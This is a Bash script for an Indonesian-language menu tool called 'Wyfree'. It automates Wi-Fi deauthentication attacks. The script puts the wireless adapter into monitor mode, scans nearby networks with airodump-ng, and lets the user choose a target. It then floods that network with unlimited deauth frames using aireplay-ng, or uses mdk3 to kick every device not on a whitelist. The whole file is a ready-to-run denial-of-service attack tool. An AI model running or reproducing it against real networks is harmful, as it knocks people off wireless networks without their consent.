#!/bin/bash
#Cek Hak Akses Admin
if ! [ $(id -u) = "0" ] 2>/dev/null; then
	echo "Kamu Tidak Punya Hak Akses Admin/Root, Gunakan sudo atau su"
	exit
fi
#Warna
orange="\033[0;38;5;3m"
white="\033[1;37m"
grey="\033[0;37m"
red="\033[1;31m"
lgreen="\033[1;32m"
yellow="\033[1;33m"
lblue="\033[1;34m"
blue="\033[0;38;5;6m"
#Beberapa Variabel
hostname=$(hostname)
persyaratan=false
versi=1.1
dir=$(echo $HOME)
pengaturan=${dir}/.wyfree/pengaturan.ini
#Animasi Loading
animasi() {
    local pid=$1
    local delay=0.75
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}
#Keluar
keluar() {
	if test -d /sys/class/net/mon0 ;then
		if ! cfg_read $pengaturan simpan | grep -q "true" ;then
			iw mon0 del
		fi
	fi
	sleep 0.025 && judul
	echo -e -n "${white}Shutting down Wyfree ${red}" && sleep 3.5 &
	animasi "$!"
	clear
	exit
}
#Judul
judul() {
  clear
  echo -e "${lgreen}#########################################################"
  echo -e "${lgreen}#${lblue}__      __     __                       ${white}~${red}F${lblue}re${white}e ${red}Y${lblue}ou${white}r ${red}W${lblue}if${white}i${lgreen}#"
  echo -e "${lgreen}#${lblue}\ \    / /  _ / _|_ _ ___ ___                          ${lgreen}#"
  echo -e "${lgreen}#${lblue} \ \/\/ / || |  _| '_/ -_) -_)                         ${lgreen}#"
  echo -e "${lgreen}#${lblue}  \_/\_/ \_, |_| |_| \___\___|                         ${lgreen}#"
  echo -e "${lgreen}#${lblue}         |__/            ${red}v.${versi}     ${lblue} by:${lblue}bedman${white}1${red}7 & ${red}7${lblue}UFF${white}1${lgreen}#"
  echo -e "${lgreen}#########################################################"
}
#Cek Persyaratan
syarat() {
  echo -e -n ${white}Adaptor Wireless.
	 if test -d /sys/class/net/wlan0 ;then
     echo -e "${lgreen}Ada"
   else
     echo -e "${red}Tidak Ada"
     persyaratan=true
   fi
  sleep 0.025
  echo -e -n ${white}Iw...............
	if ! hash iw 2>/dev/null;then
    echo -e "${red}Tidak Ada"
    persyaratan=true
  else
    echo -e "${lgreen}Ada"
  fi
	sleep 0.025
  echo -e -n ${white}Iwconfig.........
  if ! hash iwconfig 2>/dev/null;then
    echo -e "${red}Tidak Ada"
		persyaratan=true
	else
		echo -e "${lgreen}Ada"
	fi
	sleep 0.025
  echo -e -n ${white}Mdk3.............
	if ! hash mdk3 2>/dev/null;then
		echo -e "${red}Tidak Ada"
		persyaratan=true
	else
		echo -e "${lgreen}Ada"
	fi
	sleep 0.025
  echo -e -n ${white}Aireplay-ng......
	if ! hash aireplay-ng 2>/dev/null;then
		echo -e "${red}Tidak Ada"
		persyaratan=true
	else
		echo -e "${lgreen}Ada"
	fi
	sleep 0.025
  echo -e -n ${white}Airodump-ng......
	if ! hash airodump-ng 2>/dev/null;then
		echo -e "${red}Tidak Ada"
		persyaratan=true
	else
		echo -e "${lgreen}Ada"
	fi
	sleep 0.025
  echo -e -n ${white}Xterm............
	if ! hash xterm 2>/dev/null;then
		echo -e "${red}Tidak Ada"
		persyaratan=true
	else
		echo -e "${lgreen}Ada"
	fi
	sleep 0.025
	if $persyaratan ;then
    echo -e -n ${white}Error Loading...${red}&& sleep 3.5 &
    animasi "$!"
		keluar
	fi
}
#Config
if ! test -d ${dir}/.wyfree;then
	mkdir ${dir}/.wyfree
fi
if ! test -e $pengaturan;then
	echo -e -n "mode = whitelist\nsimpan = false" > $pengaturan
fi
sed_escape() {
  sed -e 's/[]\/$*.^[]/\\&/g'
}
cfg_write() { # path, key, value
  cfg_delete "$1" "$2"
  echo "$2 = $3" >> "$1"
}
cfg_read() { # path, key -> value
	cat "$1" | grep "$2" | awk '{print $3}'
}
cfg_delete() { # path, key
  test -f "$1" && sed -i "/^$(echo $2 | sed_escape).*$/d" "$1"
}
cfg_haskey() { # path, key
  test -f "$1" && grep "^$(echo "$2" | sed_escape)=" "$1" > /dev/null
}
judul
syarat
echo -e -n ${white}Loading Wyfree..${lgreen}&& sleep 3.5 &
animasi "$!"
##Membuat dan me-Whitelist MAC address kamu
if ! test -e  ${dir}/.wyfree/whitelist.txt;then
	echo "#Yang dibawah ini adalah MAC address kamu (JANGAN DI HAPUS!!!)" >> ${dir}/.wyfree/whitelist.txt
	cat /sys/class/net/wlan0/address >> ${dir}/.wyfree/whitelist.txt
fi
##Membuat file blacklist
if ! test -e ${dir}/.wyfree/blacklist.txt;then
  touch ${dir}/.wyfree/blacklist.txt
fi
#Menu Utama
menuutama() {
	judul
	sleep 0.025 && echo -e "${white}1. ${lblue}Tendang"
	sleep 0.025 && echo -e "${white}2. ${lblue}Buat Interface mon0"
	sleep 0.025 && echo -e "${white}3. ${lblue}Cek Interface mon0"
	sleep 0.025 && echo -e "${white}4. ${lblue}Hapus Interface mon0"
	sleep 0.025 && echo -e "${white}9. ${lblue}Pengaturan"
	sleep 0.025 && echo -e "${white}0. ${red}Exit"
	echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read respon
	jawaban
}
#Function Untuk Menu Utama
nomor1() {
	if test -d /sys/class/net/mon0 ;then
    judul
		sleep 0.025 && echo -e "${white}Pilih tool yang ingin digunakan:"
		sleep 0.025 && echo -e "${white}1. ${lblue}Aireplay-ng"
		sleep 0.025 && echo -e "${white}2. ${lblue}Mdk3"
		sleep 0.025 && echo -e "${white}0. ${red}Kembali ke menu utama"
		echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read jawab
		if [ $jawab == 1 ] ;then
			nomor11
		elif [ $jawab == 2 ] ;then
			nomor12
		elif [ $jawab == 0 ] ;then
			menuutama
		else
			nomor1
		fi
	else
		echo -e -n "${white}Interface mon0 tidak ditemukan, silahkan buat dulu ${red}"&& sleep 3.5 &
		animasi "$!"
		menuutama
	fi
}
nomor11() {
  judul
  if test -e ${dir}/.wyfree/airdump-01.csv ;then
    rm ${dir}/.wyfree/airdump-01.csv
  fi
  if test -e ${dir}/.wyfree/bssid.txt ;then
    rm ${dir}/.wyfree/bssid.txt
  fi
  if test -e ${dir}/.wyfree/essid.txt ;then
    rm ${dir}/.wyfree/essid.txt
  fi
  echo -e "${white}Anda memilih tool Aireplay-ng. Tool ini memerlukan"
  echo -e "MAC dari wifi yang menjadi target anda. Tool"
  echo -e "Airodump-ng akan digunakan untuk mencari MACnya."
  echo -e "Tekan enter untuk melanjutkan"
  echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read enter
  airdump
}
airdump() {
  xterm -geometry 108x24 -T "Tutup window ini jika wifi target anda sudah muncul" -e "airodump-ng -w ${dir}/.wyfree/airdump --output-format csv mon0"
  awk -F "\"*,\"*" '{print $1}' ${dir}/.wyfree/airdump-01.csv | sed -n -e '/BSSID/,/Station/ p' | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > ${dir}/.wyfree/bssid.txt
  awk -F "\"*,\"*" '{print $14}' ${dir}/.wyfree/airdump-01.csv | sed 's/\<ESSID\>//g' | awk 'NF' > ${dir}/.wyfree/essid.txt
  jumlah=$(wc -l ${dir}/.wyfree/bssid.txt | grep -o '[0-9]*')
  dump
}
dump() {
  if [[ $jumlah == 0 ]] ;then
    judul
    echo -e "${white}Sepertinya tool airodump-ng gagal menemukan wifi"
    echo -e "disekitar kamu, coba lagi? (ya/tidak)"
    echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read yatidak
    if [[ $yatidak == "ya" ]] ;then
      airdump
    elif [[ $yatidak == "tidak" ]] ;then
      menuutama
    else
      dump
    fi
  else
    declare -a bssid
    declare -a essid
    for ((i=1; i<=$jumlah; i++))
    do
      bssid[$i-1]=$(sed -n -e ${i}p ${dir}/.wyfree/bssid.txt)
      essid[$i-1]=$(sed -n -e ${i}p ${dir}/.wyfree/essid.txt)
    done
    choosemac
  fi
}
choosemac() {
  judul
  echo -e "${lblue}No.  ESSID\t\t\t\tBSSID"
  for ((i=1; i<=$jumlah; i++))
  do
    if [[ $i -lt 10 ]] ;then
      echo -e -n "${red}0$i. ${white}${essid[$i-1]}"
        for ((x=1; x<=(36-${#essid[$i-1]}); x++))
        do
          echo -e -n " "
        done
      echo -e -n "${bssid[$i-1]}"
    else
      echo -e -n "${red}$i. ${white}${essid[$i-1]}"
        for ((x=1; x<=(36-${#essid[$i-1]}); x++))
        do
          echo -e -n " "
        done
      echo -e -n "${bssid[$i-1]}"
    fi
  echo ""
  done
  echo -e "${yellow}99. Scan wifi lagi"
  echo -e "${red}00.  Kembali ke menu utama"
  echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read jawab
  re='^[0-9]+$'
  if [[ $jawab =~ $re ]] ;then
    if [[ $jawab -le $jumlah && $jawab -gt 0 ]] ;then
      xterm -T "Aireplay-ng" -e "aireplay-ng --deauth 0 -a ${bssid[$jawab-1]} --ignore-negative-one mon0"
      judul
      echo -e -n "${white}Selesai Menendang ${lgreen}" && sleep 3.5 &
    	animasi "$!"
    	menuutama
    elif [[ $jawab == "99" ]] ;then
      airdump
    elif [[ $jawab == "00" ]] ;then
      menuutama
    else
      choosemac
    fi
  else
    choosemac
  fi
}
nomor12() {
  wb=$(cat $pengaturan | grep "mode" | awk '{print $3}')
	judul
	echo -e "${white}Kamu memilih tool mdk3. Tool ini akan di jalankan"
	echo -e "${white}dalam mode ${wb}, anda bisa mengubah modenya di"
	echo -e -n "pengaturan. Tekan enter untuk melanjutkan" & read enter
	judul
	echo -e "${white}Bersiap Menendang..."
	sleep 1
	judul
	echo -e "${red}Sedang Menendang..." && xterm -T "mdk3 mode ${wb}" -e "mdk3 mon0 d -w ${dir}/.wyfree/${wb}.txt"
  judul
	echo -e -n "${white}Selesai Menendang ${lgreen}" && sleep 3.5 &
	animasi "$!"
	menuutama
}
nomor2() {
  echo "Checking interface mon0..."
  sleep 1
	if test -d /sys/class/net/mon0 ;then
		echo -e -n ${white}Interface mon0 sudah ada ${yellow}&& sleep 3.5 &
		animasi "$!"
		menuutama
	else echo "Membuat Interface mon0..."
	  iw wlan0 interface add mon0 type monitor
		ifconfig mon0 down
		iwconfig mon0 mode monitor
		ifconfig mon0 up
		echo -e -n ${white}Interface mon0 berhasil di buat ${lgreen}&& sleep 3.5 &
		animasi "$!"
		menuutama
	fi
}
nomor3() {
  echo "Checking interface mon0..."
	 sleep 1
	 if test -d /sys/class/net/mon0 ;then
     echo -e -n ${white}Interface mon0 sudah ada dan siap di gunakan ${lgreen}&& sleep 3.5 &
     animasi "$!"
     menuutama
	 else
     echo -e -n ${white}Interface mon0 tidak ditemukan ${red}&& sleep 3.5 &
     animasi "$!"
     menuutama
   fi
}
nomor4() {
  echo "Checking interface mon0..."
  sleep 1
  if test -d /sys/class/net/mon0 ;then
    iw mon0 del
    echo -e -n ${white}Interface mon0 berhasil dihapus ${lgreen}&& sleep 3.5 &
    animasi "$!"
    menuutama
  else
    echo -e -n ${white}Interface mon0 tidak ditemukan ${red}&& sleep 3.5 &
    animasi "$!"
    menuutama
  fi
}
nomor9() {
  judul
  sleep 0.025 && echo -e "${white}Apa yang ingin kamu ubah?"
  sleep 0.025 && echo -e "${white}1.${lblue}Simpan interface mon0 ketika keluar?"
  sleep 0.025 && echo -e "${white}2.${lblue}Mode mdk3"
  sleep 0.025 && echo -e "${white}3.${lblue}Edit File Whitelist"
  sleep 0.025 && echo -e "${white}4.${lblue}Edit File Blacklist"
  sleep 0.025 && echo -e "${white}0.${red}Kembali ke menu utama"
  echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read jawab
  if [ $jawab == 1 ] ;then
    nomor91
  elif [ $jawab == 2 ] ;then
    nomor92
  elif [ $jawab == 3 ] ;then
	  nomor93
  elif [ $jawab == 4 ] ;then
    nomor94
  elif [ $jawab == 0 ] ;then
	  menuutama
  else
	  nomor9
  fi
}
nomor91() {
  judul
  if cfg_read $pengaturan simpan | grep -q "true"  ;then
	  ada="${lgreen}disimpan"
    gada="${red}dihapus"
  else
    ada="${red}dihapus"
    gada="${lgreen}disimpan"
  fi
  sleep 0.025 && echo -e "${white}Saat ini interface mon0 akan ${ada} ${white}ketika keluar"
  sleep 0.025 && echo -e "${white}Ubah menjadi ${gada} ${white}ketika keluar?(ya/tidak)"
  echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read yatidak
  if [[ $yatidak == "ya" ]] ;then
    if echo -e $gada | grep -q "disimpan" ;then
      cfg_write $pengaturan simpan true
    else
      cfg_write $pengaturan simpan false
    fi
    echo -e -n ${white}Interface mon0 akan ${gada} ${white}ketika keluar ${lgreen}&& sleep 3.5 &
    animasi "$!"
    nomor9
  elif [[ $yatidak == "tidak" ]] ;then
    echo -e -n ${white}Interface mon0 akan ${ada} ${white}ketika keluar ${red}&& sleep 3.5 &
    animasi "$!"
    nomor9
  else
    nomor91
  fi
}
nomor92() {
  wb=$(cat $pengaturan | grep "mode" | awk '{print $3}')
  judul
  sleep 0.025 && echo -e "${white}Saat ini mdk3 akan dijalankan dalam mode ${wb}"
  if cfg_read $pengaturan mode | grep -q "whitelist" ;then
    sleep 0.025 && echo -e "${white}Dalam mode ini, mdk3 akan menendang semua orang"
    sleep 0.025 && echo -e "${white}yang MACnya tidak ada didalam file whitelist "
    kebalikan=blacklist
  else
    sleep 0.025 && echo -e "${white}Dalam mode ini, mdk3 hanya akan menendang semua"
    sleep 0.025 && echo -e "orang yang MACnya ada di dalam file blacklist"
    kebalikan=whitelist
  fi
  sleep 0.025 && echo -e "${white}Ubah menjadi mode ${kebalikan}?(ya/tidak)"
  echo -e -n "${red}[${lblue}Wyfree${yellow}@${white}${hostname}${red}]-[${yellow}~${red}] ${white}"& read yatidak
  if [ $yatidak == "ya" ] ;then
    cfg_write $pengaturan mode $kebalikan

    echo -e -n "${white}Berhasil di ubah menjadi mode ${kebalikan}${lgreen}" && sleep 3.5 &
    animasi "$!"
    nomor9
  elif [ $yatidak == "tidak" ] ;then
    echo -e -n "${white}mdk3 akan tetap dijalankan pada mode ${wb}${red}" && sleep 3.5 &
    animasi "$!"
    nomor9
  else
    nomor92
  fi
}
nomor93() {
  nano ${dir}/.wyfree/whitelist.txt
  nomor9
}
nomor94() {
  nano ${dir}/.wyfree/blacklist.txt
  nomor9
}
jawaban() {
  if [ $respon == 1 ] ;then
	  nomor1
  elif [ $respon == 2 ] ;then
    nomor2
  elif [ $respon == 3 ] ;then
    nomor3
  elif [ $respon == 4 ] ;then
    nomor4
  elif [ $respon == 9 ] ;then
    nomor9
  elif [ $respon == 0 ] ;then
    keluar
  else
    menuutama
  fi
}
trap 'keluar' SIGINT
menuutama
